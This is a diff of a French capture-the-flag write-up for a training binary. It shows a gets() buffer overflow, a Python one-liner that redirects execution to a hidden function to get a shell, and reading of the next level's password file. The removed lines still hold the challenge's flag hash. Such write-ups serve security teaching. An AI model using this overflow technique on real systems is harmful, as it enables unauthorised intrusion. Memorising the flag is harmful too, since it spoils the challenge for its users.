@@ -19,7 +19,7 @@ Illegal instruction (core dumped)
 Ici le code overflow grace a la fonction gets,
 cette fonction est dépréciée car elle pose ce gros probleme de sécurité
 
-La taille du buffer est maintenant connue et elle est de 76 bytes
+La taille du buffer est maintenant connue et elle est de 76 octets
 
 Dans le code du programme une fonction "run" se cache a l'interieur et elle permet l'execution de cette ligne:
     system("/bin/ls");
@@ -27,9 +27,9 @@ Dans le code du programme une fonction "run" se cache a l'interieur et elle perm
 elle se situe a l'addresse 0x08048444
 donc si on execute cette ligne, grace a l'overflow on reussi a executer la fonction run et on peut donc recuperer le flag depuis le shell proposé.
 
-$> (python -c "print 'A' * 76" + '\x44\x84\x04\x08'" ; cat) | ./level1
+$> (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
 whoami
 level2
 cd /home/user/level2
 cat .pass
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+**************************************************************** => (Pas de spoil ici, voir le fichier flag)
